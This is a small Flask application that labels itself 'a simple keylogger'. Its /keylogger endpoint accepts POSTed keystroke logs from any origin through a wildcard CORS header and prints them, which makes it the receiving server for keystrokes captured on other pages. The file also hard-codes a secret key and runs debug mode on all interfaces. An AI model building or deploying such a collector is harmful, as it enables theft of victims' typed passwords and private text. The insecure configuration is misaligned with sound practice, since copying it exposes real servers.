from flask import Flask, render_template, jsonify, request
from flask_behind_proxy import FlaskBehindProxy
app = Flask(__name__)
proxied = FlaskBehindProxy(app)
app.config['SECRET_KEY'] = 'c29bcfa698752666def85f68880d22d8'


@app.route("/")
def home():
    return "I'm a simple keylogger"

@app.route("/test")
def test():
    return render_template('home.html', subtitle='Home Page', text='This is the home page')

@app.route("/keylogger", methods=['POST'])
def keylogger():
    keylog = request.form.get('keylog')

    print("keylog: ",keylog)

    response = jsonify({"test":"test"})
    response.headers.add('Access-Control-Allow-Origin', '*')
    return response
    # return '', 204

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")